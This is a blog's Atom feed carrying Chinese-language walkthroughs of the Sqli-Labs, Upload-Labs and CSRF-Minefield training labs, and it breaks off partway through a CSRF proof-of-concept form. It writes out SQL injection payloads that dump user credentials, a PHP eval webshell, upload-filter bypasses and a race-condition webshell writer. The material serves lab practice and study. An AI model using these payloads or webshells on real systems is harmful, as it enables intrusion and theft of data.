<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yzctzl</title>
  
  <subtitle>真的勇士，敢于直面惨淡的人生</subtitle>
  <link href="https://yzctzl.github.io/atom.xml" rel="self"/>
  
  <link href="https://yzctzl.github.io/"/>
  <updated>2023-05-22T16:00:00.000Z</updated>
  <id>https://yzctzl.github.io/</id>
  
  <author>
    <name>yzctzl</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Sqli-Labs 靶场通关记录</title>
    <link href="https://yzctzl.github.io/2023/VulLabs/sqlilabs/"/>
    <id>https://yzctzl.github.io/2023/VulLabs/sqlilabs/</id>
    <published>2023-05-22T16:00:00.000Z</published>
    <updated>2023-05-22T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Basic-Challenges"><a href="#Basic-Challenges" class="headerlink" title="Basic Challenges"></a>Basic Challenges</h2><h3 id="Less-01"><a href="#Less-01" class="headerlink" title="Less-01"></a>Less-01</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">- 正常访问</span><br><span class="line">http://192.144.236.48:51494/Less-1/?id=1</span><br><span class="line"></span><br><span class="line">- 添加 &#x27; </span><br><span class="line">返回报错信息：You have an error in your SQL syntax; check the manual that corresponds to your     MySQL  server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class="line"></span><br><span class="line">- 使用 1&#x27; order by 3 --+</span><br><span class="line">得到列数为3</span><br><span class="line"></span><br><span class="line">- 使用union 获取admin和password</span><br><span class="line">-1 的作用是查询不存在的值，使得结果为空，则返回为 union 内容</span><br><span class="line">-1 &#x27; union select 1,2,3 // 确定可以显示到页面的位置</span><br><span class="line">-1 &#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata // 得到数据库名 或 通过database() 获取数据库名</span><br><span class="line">-1 &#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27; %23</span><br><span class="line">-1 &#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;%23</span><br><span class="line">-1 &#x27; union select 1,username,password from users %23</span><br><span class="line">    -1 &#x27; union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users %23</span><br><span class="line">    -1 &#x27; union select database(),version(),group_concat(id,0x7c,username,0x7c,password) from users --+</span><br></pre></td></tr></table></figure><h3 id="Less-02"><a href="#Less-02" class="headerlink" title="Less-02"></a>Less-02</h3><p>同 01 但 无需闭合单引号，数字型的</p><h3 id="Less-03"><a href="#Less-03" class="headerlink" title="Less-03"></a>Less-03</h3><p>同 01 但 有个括号需要闭合</p><h3 id="Less-04"><a href="#Less-04" class="headerlink" title="Less-04"></a>Less-04</h3><p>同 01 但 需要闭合双引号和括号</p><h3 id="Less-05"><a href="#Less-05" class="headerlink" title="Less-05"></a>Less-05</h3><p>看似盲注，可用双注来显示想要的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">as ： 别名</span><br><span class="line">rand: 遵循四舍五入把原值转化为指定小数位数</span><br><span class="line">floor: 向下舍入为指定小数位数</span><br><span class="line">ceiling: 向上舍入为指定小数位数</span><br><span class="line">rand: 返回一个介于 0 到 1（不包括 0 和 1）之间的伪随机 float 值</span><br><span class="line">group by: GROUP BY必须得配合聚合函数来用，根据字段来分类</span><br><span class="line">- 使用</span><br><span class="line">select count(*) from [table] group by concat(&#x27;~&#x27;,([真正的查询语句]),&#x27;~&#x27;，floor(rand(0)*2))</span><br><span class="line">select count(*),concat_ws(char(32,58,32),([查询语句]),floor(rand(0)*2)) as a from [table] group by a</span><br><span class="line">- 原理</span><br><span class="line">简单来说就是count等聚合函数之后，如果使用分组语句，就会把查询的一部分以错误的形式显示出来，即人为的制造一个错误来显示需要的内容</span><br></pre></td></tr></table></figure><p>注入方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,count(*),concat(0x3a,([select database()]),0x3a,floor(rand()*2))a from information_schema.columns group by a--+</span><br><span class="line">-1&#x27; union select count(*),2,concat( &#x27;~&#x27;,(select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 3,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.schemata group by a %23 //获取表 users</span><br><span class="line">-1&#x27; union select count(*),1,concat( &#x27;~&#x27;,(select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.schemata group by a %23  // 这里爆出了他三个字段，注意如果字段不存在也是返回you are in </span><br><span class="line">-1&#x27; union select count(*),1,concat( &#x27;~&#x27;,(select concat(id,username,password) from users limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.schemata group by a %23  // 成功拿到 password username</span><br></pre></td></tr></table></figure><p>此外还可用盲注：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">介绍几个语法：</span><br><span class="line">截取字符串： </span><br><span class="line">    left: Left ( string, n )  得到字符串左部指定个数的字符，</span><br><span class="line">    substr: substr(string, start, length) 和substring()函数一样，截取字符串，第一个为处理的字符串，开始位置，长度 </span><br><span class="line">    mid: MID(column_name,start[,length]) // 前两个字段为必须，length 为可选，选择开始字段，开始位置，截取长度。</span><br><span class="line">ascii: 返回字符串str的最左字符的数值,返回ascii值，0-255</span><br><span class="line">length: 对字段长度破解，一般先对长度破解，然后在爆破字段值，这个一般采用二分法进行破解。</span><br><span class="line">strcmp: 可以配合left 来使用，如果相等返回0 小于返回1 大于返回-1</span><br><span class="line">regexp: 通过regexp 和 正则表达式来获取字段 这个时候 会匹配所有的字段，所以limit已经不起作用</span><br><span class="line"></span><br><span class="line">1&#x27; and left(version(),1)=5 %23 // 判断当最左侧字符等于5时 返回you are in </span><br><span class="line">1&#x27; and left(version(),2)=5.%23 // 可以通过这样慢慢推出整个字段值</span><br><span class="line"></span><br><span class="line">使用substr 和ascii 来推出表名</span><br><span class="line">1&#x27; and ascii(substr(select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1) &gt; 80 %23</span><br><span class="line">尝试使用regexp</span><br><span class="line">1&#x27; and (select 1 from information_schema.columns where table_name = &#x27;users&#x27; and column_name regexp &#x27;^pass[a-z]&#x27; ;)=1 %23</span><br><span class="line">使用 ord mid </span><br><span class="line">ord 和ascii 一样</span><br><span class="line">mid(column_name,start[,length]) // 从位置start开始，截取column_name字符串的length位，与substr作用相同</span><br><span class="line">这里就类似ascii(substr) == ord(mid())</span><br><span class="line">cast(username as char) 将 username 转成字符串</span><br><span class="line">ifnull(exp1,exp2) exp1 不为null 则IFNULL()的返回值为exp1; 否则其返回值为exp2。IFNULL()的返回值是数字或是字符串，具体情况取决于其所使用的语境。</span><br><span class="line">1 &#x27; and ord(mid((select ifnull (cast(username as char), 0x20) from security.users order by id limit 0,1),1,1)) = 127 %23</span><br></pre></td></tr></table></figure><h3 id="Less-06"><a href="#Less-06" class="headerlink" title="Less-06"></a>Less-06</h3><p>同 05 但 为双引号闭合</p><h3 id="Less-07"><a href="#Less-07" class="headerlink" title="Less-07"></a>Less-07</h3><h3 id="Less-08"><a href="#Less-08" class="headerlink" title="Less-08"></a>Less-08</h3><h3 id="Less-09"><a href="#Less-09" class="headerlink" title="Less-09"></a>Less-09</h3><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h3><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><h3 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h3><h3 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h3><h3 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h3><h3 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h3><h3 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h3><h3 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h3><h3 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h3><h3 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h3><h3 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h3><h3 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h3><h3 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h3><h3 id="Less-66"><a href="#Less-66" class="headerlink" title="Less-66"></a>Less-66</h3><h3 id="Less-67"><a href="#Less-67" class="headerlink" title="Less-67"></a>Less-67</h3><h3 id="Less-68"><a href="#Less-68" class="headerlink" title="Less-68"></a>Less-68</h3>]]></content>
    
    
    <summary type="html">https://github.com/Audi-1/sqli-labs</summary>
    
    
    
    <category term="Web" scheme="https://yzctzl.github.io/categories/Web/"/>
    
    
    <category term="WEB" scheme="https://yzctzl.github.io/tags/WEB/"/>
    
    <category term="VulLab" scheme="https://yzctzl.github.io/tags/VulLab/"/>
    
  </entry>
  
  <entry>
    <title>Upload-Labs 靶场通关记录</title>
    <link href="https://yzctzl.github.io/2023/VulLabs/uploadlabs/"/>
    <id>https://yzctzl.github.io/2023/VulLabs/uploadlabs/</id>
    <published>2023-05-12T16:00:00.000Z</published>
    <updated>2023-05-12T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>前端校验，直接使用 Burp 抓包，修改文件名为 p01.php 内容为一句话木马。<br><code>&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;</code></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>同上即可</p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>校验了文件名，并且会自动重命名，使用 php345&#x2F;phtml，其余同上</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>这道题需要 httpd.conf 中开启 AllowOverride All<br>因为对文件名进行了严格的辨别，上传的文件无法解析<br>所以只能利用 .htaccess 来解析为 php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">images.png</span>$&quot;&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure><p>images.png 中的内容为一句话木马</p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>根据源码，对文件扩展名做了复杂的过滤，几无可能上传可直接被解析的文件了。<br><a href="https://blog.csdn.net/weixin_47598409/article/details/115050869">从网上找到了通关指南</a><br>上传 <code>.user.ini</code> 后，再上传一张图片马，等待其起作用即可。</p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>根据源码发现对后缀的匹配是列表形式，没有大小写转换，尝试用 phP&#x2F;Php 上传 phpinfo 但无法解析。</p><p>如果 php 以 FASTCGI 的模式工作于 Apache 中，此种模式下 php 遇到类似 aaa.xxx 这种不是 <code>.php</code> 后缀的文件，会触发 500 错误，另外 nginx fpm 存在一个 security.limit_extensions 配置，默认只解析 php 后缀的文件。</p><p>同时其还会对文件重命名，所以上传 .user.ini 会失效。<br>同样尝试绕过文件后缀的检测：<code>info.php. .</code> 也会失败。</p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>没有过滤文件扩展名的空格，所以使用 <code>.php </code> 可以绕过，但不适用 Linux 系统。</p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>文件名可以保留，那需要用一种被自动忽略的后缀绕过，尝试 <code>:/&amp;.</code> 最后 点 可以成功。</p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><code>::$DATA</code> 没有检查，可以绕过；仅适用于 Windows。</p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>使用 <code>p10.php. .</code> 可以绕过，因为其末尾的 点 会被自动忽略，而 点空格接下来也会被忽略。</p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>只是一个简单的字符替换，双写绕过即可。</p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>使用 %00 截断，但要求 php&lt;5.3.4 没有满足条件的环境。<br>具体参考<a href="(https://blog.csdn.net/weixin_47598409/article/details/115050869)">通关攻略</a>。</p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>同上</p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>制作图片马，二进制合并即可：<code>copy a.jpg /b + b.php /a c.jpg</code></p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>调用 getimagesize 本质上还是在校验是否为图片。</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>使用 exif_imagetype 判断文件类型。</p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>使用 imagecreatefrompng 二次渲染。<br>经过分析 jpg png 文件结构，加入数据无法被正确识别，gif 则更方便。<br>具体参考<a href="(https://blog.csdn.net/weixin_47598409/article/details/115050869)">通关攻略</a>。</p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>注意到：首先 move_uploaded_file 将文件存放到了 upload 目录里面，然后根据执行 unlink，才回去删除，这时候可以使用条件竞争。</p><p>burp 抓包后，开始 null payload 爆破，可以把服务器连接数量调到极大，经过巨量发包，等待错误出现。</p><p>将原来一句话木马换为：<code>&lt;?php fputs(fopen(&#39;Tony.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;Tony&quot;])?&gt;&#39;);?&gt;</code> 这一样一个写木马。</p><p>这里的关键是：在 burp 不断上传的过程中，使用一个 python 脚本在不断地请求上面的木马，在写木马的 php 存在于服务器的一小段时间内如果被 python 脚本访问到了，那就写入了一个 Tony.php 的一句话木马。</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>上传图片马然后利用文件包含漏洞，但此题没有明确指出可用文件包含漏洞。<br>使用 Apache&lt;5.3.4 版本的 0x00 截断漏洞，但无法尝试。</p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>是用 multipart&#x2F;form-data; 传递的文件名，通过 大小写&#x2F;点&#x2F;::$DATA 等方式皆可，单纯匹配黑名单列表校验。</p><h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2><p>增加了很多校验，但只需要添加一下内容即可绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------46324931516294928123512598852</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[2]&quot;</span><br><span class="line"></span><br><span class="line">png</span><br></pre></td></tr></table></figure><p>漏洞成因：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//check filename</span></span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是判断 <code>$_POST[&#39;save_name&#39;]</code> 是否为列表，如果不是列表就根据 <code>.</code> 来拆分，构造 <code>save_name</code> array，一共三个元素，0 位置是文件名，1 位置置为空，2 位置是一个合法的扩展名。这样接下的 end() 就获取到了一个合法的扩展名，然后到拼接的时候 <code>count($file) - 1</code> 是 1，即拼接空，相当于原文件名没有改变。</p><h2 id="Pass-21-1"><a href="#Pass-21-1" class="headerlink" title="Pass-21"></a>Pass-21</h2><p>FCKeditor 2.4.3 文件上传漏洞，windows 可用 <code>.</code> 或 空格 等轻松绕过。</p><h2 id="Pass-22"><a href="#Pass-22" class="headerlink" title="Pass-22"></a>Pass-22</h2><p>根据 <a href="http://www.paijuanxing.online/2021/04/27/showdoc/">POC</a> 使用 <code>shell.&lt;&gt;php</code> 可以绕过，细节定位：<a href="https://github.com/star7th/showdoc/pull/1059">pull</a></p><h2 id="Pass-23"><a href="#Pass-23" class="headerlink" title="Pass-23"></a>Pass-23</h2><p>通达OA v11.8以下存在文件上传接口，可上传 .user.ini 文件包含有PHP语句的文件导致命令执行 安装包在根目录下</p><h2 id="Pass-24"><a href="#Pass-24" class="headerlink" title="Pass-24"></a>Pass-24</h2><p>通达OA v11.2 upload.php 后台任意文件上传漏洞 安装包在根目录下</p><p>23&#x2F;24 均未实验。</p>]]></content>
    
    
    <summary type="html">https://github.com/c0ny1/upload-labs</summary>
    
    
    
    <category term="Web" scheme="https://yzctzl.github.io/categories/Web/"/>
    
    
    <category term="WEB" scheme="https://yzctzl.github.io/tags/WEB/"/>
    
    <category term="VulLab" scheme="https://yzctzl.github.io/tags/VulLab/"/>
    
  </entry>
  
  <entry>
    <title>CSRF-Minefield 靶场通关记录</title>
    <link href="https://yzctzl.github.io/2023/VulLabs/csrf_minefield/"/>
    <id>https://yzctzl.github.io/2023/VulLabs/csrf_minefield/</id>
    <published>2023-05-07T16:00:00.000Z</published>
    <updated>2023-05-07T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>重要的业务逻辑，仅仅使用一个 GET&#x2F;POST 来实现，如果这个 POST 很容易被伪造出来，那诱导受害者点击就能实现后台的一些敏感操作。</p><h2 id="00-SameSite"><a href="#00-SameSite" class="headerlink" title="00 SameSite"></a>00 SameSite</h2><p>Chrome 从 80 开始默认开启 SameSite&#x3D;Lax<br>Lax：GET 携带 Cookie，POST 不携带；None: 无限制；Strict：完全禁止第三方 Cookie<br>SameSite：<a href="https://web.dev/i18n/zh/samesite-cookies-explained/">https://web.dev/i18n/zh/samesite-cookies-explained/</a></p><p>所以这里使用火狐浏览器。</p><h2 id="01-Bolt-CMS-3-6-6"><a href="#01-Bolt-CMS-3-6-6" class="headerlink" title="01 Bolt CMS 3.6.6"></a>01 Bolt CMS 3.6.6</h2><p>后台地址：<a href="http://192.168.29.140/bolt/public/bolt/login">http://192.168.29.140/bolt/public/bolt/login</a></p><p>介绍链接中的 <a href="https://www.exploit-db.com/exploits/46664">exploit</a> 未能生效；从网上找到了：<br><a href="https://nvd.nist.gov/vuln/detail/cve-2020-4040">https://nvd.nist.gov/vuln/detail/cve-2020-4040</a><br><a href="https://nvd.nist.gov/vuln/detail/cve-2020-4041">https://nvd.nist.gov/vuln/detail/cve-2020-4041</a></p><h3 id="xss-csrf"><a href="#xss-csrf" class="headerlink" title="xss&#x2F;csrf"></a>xss&#x2F;csrf</h3><p>xss 和 csrf 都在 Preview 页面，在 POST 请求时未对 Cookie 作任何检查，也无 token，PoC：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.29.140/bolt/public/preview/page&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;content<span class="symbol">&amp;#95;</span>edit<span class="symbol">&amp;#91;</span><span class="symbol">&amp;#95;</span>token<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;e2x6vxs8q<span class="symbol">&amp;#95;</span>e2txfon9TUIsXTEBIZbK9JauKdZnySHXg&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;editreferrer&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;contenttype&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pages&quot;</span> /&gt;</span></span><br><span class="line">      <span 